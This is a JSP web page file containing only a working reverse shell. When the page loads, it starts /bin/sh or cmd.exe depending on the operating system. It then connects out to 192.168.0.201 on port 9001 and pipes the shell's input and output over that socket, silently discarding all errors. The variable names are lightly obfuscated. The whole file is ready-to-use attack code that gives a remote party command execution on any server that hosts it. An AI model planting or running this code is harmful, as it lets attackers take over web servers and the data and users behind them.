<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream bT;
    OutputStream uz;

    StreamConnector( InputStream bT, OutputStream uz )
    {
      this.bT = bT;
      this.uz = uz;
    }

    public void run()
    {
      BufferedReader pN  = null;
      BufferedWriter gWw = null;
      try
      {
        pN  = new BufferedReader( new InputStreamReader( this.bT ) );
        gWw = new BufferedWriter( new OutputStreamWriter( this.uz ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = pN.read( buffer, 0, buffer.length ) ) > 0 )
        {
          gWw.write( buffer, 0, length );
          gWw.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( pN != null )
          pN.close();
        if( gWw != null )
          gWw.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "192.168.0.201", 9001 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
